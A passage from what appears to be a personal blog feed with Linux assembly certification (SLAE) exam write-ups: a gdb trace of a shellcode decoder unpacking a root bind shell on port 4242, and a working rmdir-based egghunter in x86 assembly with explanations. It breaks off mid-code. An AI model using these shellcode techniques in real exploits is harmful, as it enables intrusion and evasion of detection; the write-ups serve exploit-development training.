<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gdb -q decoder
</span><span class='line'>Reading symbols from decoder...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b _start
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048080
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r
</span><span class='line'>Starting program: /attic/slae/exam/0x04-encoder/decoder
</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> _start:
</span><span class='line'><span class="o">=</span>&gt; 0x08048080 &lt;+0&gt;:     xor    ecx,ecx
</span><span class='line'>   0x08048082 &lt;+2&gt;:     mul    ecx
</span><span class='line'>   0x08048084 &lt;+4&gt;:     fldz
</span><span class='line'>   0x08048086 &lt;+6&gt;:     jmp    0x80480db &lt;decoder_pc&gt;
</span><span class='line'>End of assembler dump.
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">[</span> IF <span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048080 in _start <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> disass decoder_pc
</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> decoder_pc:
</span><span class='line'>   0x080480db &lt;+0&gt;:     fstenv <span class="o">[</span>esp-0xc<span class="o">]</span>
</span><span class='line'>   0x080480e0 &lt;+5&gt;:     pop    eax
</span><span class='line'>   0x080480e1 &lt;+6&gt;:     lea    esi,<span class="o">[</span>eax+0x4<span class="o">]</span>
</span><span class='line'>   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
</span><span class='line'>End of assembler dump.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *decoder_pc+6
</span><span class='line'>Breakpoint <span class="m">2</span> at 0x80480e1
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue</span>
</span><span class='line'>Continuing.
</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> decoder_pc:
</span><span class='line'>   0x080480db &lt;+0&gt;:     fstenv <span class="o">[</span>esp-0xc<span class="o">]</span>
</span><span class='line'>   0x080480e0 &lt;+5&gt;:     pop    <span class="nv">eax</span>
</span><span class='line'><span class="o">=</span>&gt; 0x080480e1 &lt;+6&gt;:     lea    esi,<span class="o">[</span>eax+0x4<span class="o">]</span>
</span><span class='line'>   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
</span><span class='line'>End of assembler dump.
</span><span class='line'><span class="nv">$2</span> <span class="o">=</span> <span class="o">[</span> PF IF <span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Breakpoint 2, 0x080480e1 in decoder_pc <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> i r eax
</span><span class='line'>eax            0x8048084        134512772
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/i <span class="nv">$eax</span>
</span><span class='line'>   0x8048084 &lt;_start+4&gt;:        fldz
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/4x decoder_shellcode
</span><span class='line'>0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/4x <span class="nv">$eax</span>+4
</span><span class='line'>0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> disass decoder_regular
</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> decoder_regular:
</span><span class='line'>   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR <span class="o">[</span>esi<span class="o">]</span>,0x2a
</span><span class='line'>   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR <span class="o">[</span>esi<span class="o">]</span>
</span><span class='line'>   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR <span class="o">[</span>esp<span class="o">]</span>,al
</span><span class='line'>   0x080480f8 &lt;+8&gt;:     inc    esi
</span><span class='line'>   0x080480f9 &lt;+9&gt;:     inc    esp
</span><span class='line'>   0x080480fa &lt;+10&gt;:    inc    edx
</span><span class='line'>   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
</span><span class='line'>   0x080480fd &lt;+13&gt;:    sub    esp,edx
</span><span class='line'>   0x080480ff &lt;+15&gt;:    jmp    esp
</span><span class='line'>End of assembler dump.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *0x080480ff
</span><span class='line'>Breakpoint <span class="m">3</span> at 0x80480ff
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue</span>
</span><span class='line'>Continuing.
</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> decoder_regular:
</span><span class='line'>   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR <span class="o">[</span>esi<span class="o">]</span>,0x2a
</span><span class='line'>   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR <span class="o">[</span>esi<span class="o">]</span>
</span><span class='line'>   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR <span class="o">[</span>esp<span class="o">]</span>,al
</span><span class='line'>   0x080480f8 &lt;+8&gt;:     inc    esi
</span><span class='line'>   0x080480f9 &lt;+9&gt;:     inc    esp
</span><span class='line'>   0x080480fa &lt;+10&gt;:    inc    edx
</span><span class='line'>   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
</span><span class='line'>   0x080480fd &lt;+13&gt;:    sub    esp,edx
</span><span class='line'><span class="o">=</span>&gt; 0x080480ff &lt;+15&gt;:    jmp    esp
</span><span class='line'>End of assembler dump.
</span><span class='line'><span class="nv">$3</span> <span class="o">=</span> <span class="o">[</span> PF SF IF <span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Breakpoint 3, 0x080480ff in decoder_regular <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/10i <span class="nv">$esp</span>
</span><span class='line'>   0xbffff714:  xor    eax,eax
</span><span class='line'>   0xbffff716:  xor    esi,esi
</span><span class='line'>   0xbffff718:  cdq
</span><span class='line'>   0xbffff719:  mov    ax,0x167
</span><span class='line'>   0xbffff71d:  push   0x2
</span><span class='line'>   0xbffff71f:  pop    ebx
</span><span class='line'>   0xbffff720:  push   0x1
</span><span class='line'>   0xbffff722:  pop    ecx
</span><span class='line'>   0xbffff723:  int    0x80
</span><span class='line'>   0xbffff725:  xchg   ebx,eax
</span></code></pre></td></tr></table></div></figure>


<p>Given the above, the shellcode is being correctly decoded on the stack. Executing it yields a bind shell:</p>

<figure class='code'><figcaption><span>executing the shellcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./shellcode</span>
</span><span class='line'>Shellcode length: 129
</span><span class='line'><span class="nv">$ </span>ss -nlt<span class="p">|</span>grep 4242
</span><span class='line'>LISTEN     <span class="m">0</span>      <span class="m">0</span>            *:4242                     *:*
</span><span class='line'><span class="nv">$ </span>nc -v 127.0.0.1 4242
</span><span class='line'>Connection to 127.0.0.1 <span class="m">4242</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x03: Egghunter]]></title>
    <link href="http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter/"/>
    <updated>2018-06-19T23:56:39+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>This exercise consisted in using the egghunter technique, which is rather useful when a shellcode is bigger than the available space. On those circumstances, an egg can be planted right before the second stage shellcode which when found by the hunter will be executed.</p>

<p>There is an interesting resource by <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">skape</a> which explains this concept quite well, as well as, various Linux implementations.</p>

<p>The one I came up with is based on his revisited <a href="http://man7.org/linux/man-pages/man2/access.2.html">access(2)</a> system call with some differences. I&rsquo;ve decided to instead use the <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call and to start on the very first page of the process virtual address space. Even though Linux reserves the first few pages for performance reasons and prevents a process of allocating them to avoid potential security issues related to NULL pointer dereferences on page zero, not starting the search at 0x10000 (see <a href="https://www.kernel.org/doc/Documentation/sysctl/vm.txt">vm.mmap_min_addr</a>) allows shaving off a few bytes.</p>

<p>The <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call will check if the provided address is valid. If for any reason the address can&rsquo;t be accessed (unmapped, invalid permissions, etc), then EFAULT (-14) is returned, which the egghunter should check for robustness. In that case, the next page (PAGE_SIZE) is tried until addressable memory is found.</p>

<figure class='code'><figcaption><span>retrieving the error code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-errno EFAULT
</span><span class='line'>14
</span><span class='line'>0xfffffffffffffff2
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>rmdir(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">rmdir</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>retrieving the system call number and size of page</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall rmdir
</span><span class='line'><span class="c">#define __NR_rmdir 40</span>
</span><span class='line'>0x28
</span><span class='line'><span class="nv">$ </span>getconf PAGE_SIZE
</span><span class='line'>4096
</span></code></pre></td></tr></table></div></figure>


<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 40                 |
| ebx      | address to search  |
+----------+--------------------+
</code></pre>

<p>To avoid repeating the egg twice and save space, the non-executable egg is also calculated on the fly by incrementing its value.</p>

<p>String comparison is done with the scas family, which depending on the direction flag (DF) being set or not it automatically increments or decrements the pointer to the next character. To illustrate this, consider the following program where a string is printed to the screen character by character. This is using the <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the string to print:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nl">direction_print:</span>
</span><span class='line'>  <span class="nf">pushad</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x4</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">ssize_t</span> <span class="no">write</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">const</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">size_t</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">0x1</span>             <span class="err">;</span> <span class="no">fd</span>
</span><span class='line'>  <span class="nf">lea</span> <span class="no">ecx</span><span class="p">,</span> <span class="err">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0x1c</span><span class="err">]</span>   <span class="err">;</span> <span class="no">buf</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">0x1</span>             <span class="err">;</span> <span class="no">count</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">popad</span>
</span><span class='line'>  <span class="nf">ret</span>
</span><span class='line'>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">cld</span>                     <span class="err">;</span> <span class="no">clear</span> <span class="no">direction</span> <span class="no">flag</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">fldz</span>                    <span class="err">;</span> <span class="no">retrieve</span> <span class="no">the</span> <span class="no">string</span> <span class="no">address</span> <span class="no">via</span> <span class="no">fstenv</span>
</span><span class='line'>  <span class="nf">jmp</span> <span class="no">direction_pc</span>
</span><span class='line'>
</span><span class='line'>  <span class="err">;</span> <span class="nf">the</span> <span class="no">string</span> <span class="no">is</span> <span class="mi">4</span> <span class="no">bytes</span> <span class="no">below</span> <span class="no">of</span> <span class="no">fdlz</span>
</span><span class='line'>  <span class="nl">str:</span> <span class="nf">db</span> <span class="err">&quot;</span><span class="no">this</span> <span class="no">is</span> <span class="no">a</span> <span class="no">string</span><span class="err">&quot;</span><span class="p">,</span> <span class="mi">0xa</span>
</span><span class='line'>
</span><span class='line'><span class="nl">direction_loop:</span>
</span><span class='line'>  <span class="nf">lodsb</span>
</span><span class='line'>  <span class="nf">call</span> <span class="no">direction_print</span>
</span><span class='line'>  <span class="nf">loop</span> <span class="no">direction_loop</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x1</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">void</span> <span class="no">exit</span><span class="p">(</span><span class="no">int</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="nl">direction_pc:</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">the</span> <span class="no">FPU</span> <span class="no">structure</span> <span class="no">in</span> <span class="no">memory</span> <span class="no">contains</span> <span class="no">the</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">last</span> <span class="no">FPU</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">instruction</span> <span class="no">on</span> <span class="no">byte</span> <span class="mi">0xc</span> <span class="p">(</span><span class="no">the</span> <span class="no">previous</span> <span class="mi">3</span> <span class="no">bytes</span> <span class="no">are</span> <span class="no">composed</span> <span class="no">of</span> <span class="no">the</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">control</span><span class="p">,</span> <span class="no">status</span> <span class="no">and</span> <span class="no">tag</span> <span class="no">word</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">fstenv</span> <span class="err">[</span><span class="no">esp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="err">]</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">lea</span> <span class="no">esi</span><span class="p">,</span> <span class="err">[</span><span class="no">ecx</span> <span class="err">+</span> <span class="mi">0x4</span><span class="err">]</span>    <span class="err">;</span> <span class="no">string</span> <span class="no">is</span> <span class="mi">4</span> <span class="no">bytes</span> <span class="no">below</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x11</span>               <span class="err">;</span> <span class="no">string</span> <span class="no">length</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">jmp</span> <span class="no">direction_loop</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-compile direction-off.asm
</span><span class='line'><span class="nv">$ </span>asm-opcodes direction-off
</span><span class='line'>Shellcode size: 63
</span><span class='line'><span class="se">\x</span>60<span class="se">\x</span>b0<span class="se">\x</span>04<span class="se">\x</span>b3<span class="se">\x</span>01<span class="se">\x</span>8d<span class="se">\x</span>4c<span class="se">\x</span>24<span class="se">\x</span>1c<span class="se">\x</span>b2<span class="se">\x</span>01<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>61<span class="se">\x</span>c3<span class="se">\x</span>fc<span class="se">\x</span>d9<span class="se">\x</span>ee<span class="se">\x</span>eb<span class="se">\x</span>1d<span class="se">\x</span>74<span class="se">\x</span>68<span class="se">\x</span>69<span class="se">\x</span>73<span class="se">\x</span>20<span class="se">\x</span>69<span class="se">\x</span>73<span class="se">\x</span>20<span class="se">\x</span>61<span class="se">\x</span>20<span class="se">\x</span>73<span class="se">\x</span>74<span class="se">\x</span>72<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>67<span class="se">\x</span>0a<span class="se">\x</span>ac<span class="se">\x</span>e8<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>e2<span class="se">\x</span>f8<span class="se">\x</span>b0<span class="se">\x</span>01<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>9b<span class="se">\x</span>d9<span class="se">\x</span>74<span class="se">\x</span>24<span class="se">\x</span>f4<span class="se">\x</span>59<span class="se">\x</span>8d<span class="se">\x</span>71<span class="se">\x</span>04<span class="se">\x</span>6a<span class="se">\x</span>11<span class="se">\x</span>59<span class="se">\x</span>eb<span class="se">\x</span>e6
</span><span class='line'><span class="nv">$ </span>./direction-off
</span><span class='line'>this is a string
</span></code></pre></td></tr></table></div></figure>


<p>Below, the direction flag (DF) is being set, resulting in the string being printed backwards as expected:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>$ diff -u direction-off.asm direction-on.asm
</span><span class='line'><span class="gd">--- direction-off.asm   2018-06-24 17:20:35.044465700 +0100</span>
</span><span class='line'><span class="gi">+++ direction-on.asm    2018-06-24 18:54:48.168812600 +0100</span>
</span><span class='line'><span class="gu">@@ -15,7 +15,7 @@</span>
</span><span class='line'>        ret
</span><span class='line'>
</span><span class='line'> _start:
</span><span class='line'><span class="gd">-       cld                     ; clear direction flag</span>
</span><span class='line'><span class="gi">+       std                     ; set direction flag</span>
</span><span class='line'>
</span><span class='line'>        fldz                    ; retrieve the string address via fstenv
</span><span class='line'>        jmp direction_pc
</span><span class='line'><span class="gu">@@ -39,7 +39,7 @@</span>
</span><span class='line'>        fstenv [esp - 0xc]
</span><span class='line'>        pop ecx
</span><span class='line'>
</span><span class='line'><span class="gd">-       lea esi, [ecx + 0x4]    ; string is 4 bytes below</span>
</span><span class='line'><span class="gi">+       lea esi, [ecx + 0x4 + 0x11 - 1] ; string is 4 bytes below</span>
</span><span class='line'>        push 0x11               ; string length
</span><span class='line'>        pop ecx
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-compile direction-on.asm
</span><span class='line'><span class="nv">$ </span>./direction-on
</span><span class='line'>
</span><span class='line'>gnirts a si siht<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Given all of the above, the resulting egghunter shellcode is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">cld</span>                     <span class="err">;</span> <span class="no">clear</span> <span class="no">direction</span> <span class="no">flag</span> <span class="no">for</span> <span class="no">scasd</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
</span><span class='line'>
</span><span class='line'><span class="nl">egg_restart:</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x28</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">rmdir</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*)</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">increment</span> <span class="no">ebx</span> <span class="no">to</span> <span class="no">either</span> <span class="no">align</span> <span class="no">a</span> <span class="no">page</span> <span class="no">or</span> <span class="no">check</span> <span class="no">the</span> <span class="no">next</span> <span class="no">address</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">ebx</span>                 <span class="err">;</span> <span class="no">pathname</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">cmp</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xf2</span>            <span class="err">;</span> <span class="no">check</span> <span class="no">for</span> <span class="no">a</span> <span class="no">page</span> <span class="no">fault</span> <span class="no">on</span> <span class="no">the</span> <span class="no">lower</span> <span class="no">bits</span> <span class="no">only</span>
</span><span class='line'>  <span class="nf">jnz</span> <span class="no">egg_check</span>           <span class="err">;</span> <span class="no">it</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">a</span> <span class="no">valid</span> <span class="no">page</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">or</span> <span class="no">bx</span><span class="p">,</span> <span class="mi">0xfff</span>            <span class="err">;</span> <span class="no">not</span> <span class="no">an</span> <span class="no">addressable</span> <span class="no">page</span>
</span><span class='line'>  <span class="nf">jmp</span> <span class="no">egg_restart</span>         <span class="err">;</span> <span class="no">check</span> <span class="no">the</span> <span class="no">next</span> <span class="no">page</span> <span class="p">(</span><span class="mi">0xfff</span> <span class="err">+</span> <span class="mi">1</span> <span class="err">=</span> <span class="no">PAGE_SIZE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nl">egg_check:</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0xcafebabd</span>     <span class="err">;</span> <span class="no">add</span> <span class="no">initial</span> <span class="no">not</span> <span class="no">static</span> <span class="no">egg</span> <span class="no">value</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">eax</span>                 <span class="err">;</span> <span class="no">increment</span> <span class="no">the</span> <span class="no">value</span> <span class="no">to</span> <span class="no">decrease</span> <span class="no">the</span> <span class="no">size</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">ebx</span>            <span class="err">;</span> <span class="no">compare</span> <span class="no">eax</span> <span class="no">with</span> <span class="no">edi</span>
</span><span class='line'>  <span class="nf">scasd</span>                   <span class="err">;</span> <span class="no">edi</span> <span class="no">is</span> <span class="no">incremented</span> <span class="no">since</span> <span class="no">the</span> <span class="no">direction</span> <span class="no">flag</span> <span class="no">is</span> <span class="no">zero</span>
</span><span class='line'>  <span class="nf">jnz</span> <span class="no">egg_restart</span>         <span class="err">;</span> <span class="no">egg</span> <span class="no">not</span> <span class="no">found</span><span class="p">,</span> <span class="no">try</span> <span class="no">the</span> <span class="no">next</span> <span class="no">address</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">jmp</span> <span class="no">edi</span>                 <span class="err">;</span> <span class="no">edi</span> <span class="no">points</span> <span class="no">to</span> <span class="no">the</span> <span class="no">shellcode</span> <span class="no">to</span> <span class="no">execute</span>
</span></code></pre></td></tr></table></div></figure>


<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the STAGE2 variable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
